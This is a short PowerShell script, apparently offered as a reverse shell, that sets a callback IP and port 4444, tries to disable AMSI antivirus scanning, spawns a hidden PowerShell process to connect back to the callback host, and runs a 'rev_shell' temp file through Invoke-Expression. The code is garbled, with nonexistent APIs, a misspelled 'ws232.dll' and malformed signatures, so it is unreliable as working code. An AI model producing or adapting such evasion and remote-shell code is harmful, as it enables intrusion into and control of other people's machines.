powershell
$callback = "10.211.55.5"
$port = 4444
$timeout = 3

try {
    [object[]]$obj = [System.Reflection.typeof]::GetMethods([System.Management.Automation.AmsiUtils], 
['NonPublic','Public']) | Where-Object { $_.Name -eq 'AmsiScanBuffer' }
    $method = $obj[0]
    $method.Invoke([System.Reflection.Activator]::CreateInstance([System.Management.Automation.AmsiUtils])) | 
Out-Null
} catch {}


$wc = New-Object -ComObject WScript.Shell
$startProcess = $wc.Run("powershell", "-NoProfile -WindowStyle Hidden -Command ""
    Add-Type -Name SocketHandler -PassThrough : '
        [DllImport("kernel32.dll")] public static extern IntPtr CreateProcess(string lpApplicationName, string 
lpCommandLine, int dwCreationFlags, [IntPtr]lpProcessAttributes, [IntPtr]lpThreadAttributes, bool 
bInheritHandles, uint dwCreationFlags, [IntPtr]lpProcThreadIdAttr, [IntPtr]lpThread), out [IntPtr]');
        [DllImport("ws232.dll")] public static extern int socket(int af, int type, int protocol);
        [DllImport("ws232.dll")] public static extern bool WSAStartup(string lpReserved, int wta);
        [DllImport("ws232.dll")] public static extern int connect((System.Net.Sockets.Socket)s, 
[System.Net.IPEndPoint]pe, int), exists:$false); // this is the Win32 name; we'll use a native sockaddr 
instead for true evasion
        [DllImport("ws232.dll")] public static extern bool WSAClosing((System.Net.Sockets.Socket)s);

        $socket = [System.Net.Sockets.TcpClient]::new($callback, $port)$
    ""')


if (-not $startProcess.WaitForExit($timeout)) { exit 0 }

$client = Get-Content -Path "$env:TEMP\rev_shell_$((Get-Random).ToString())" | Invoke-Expression # optional 
check
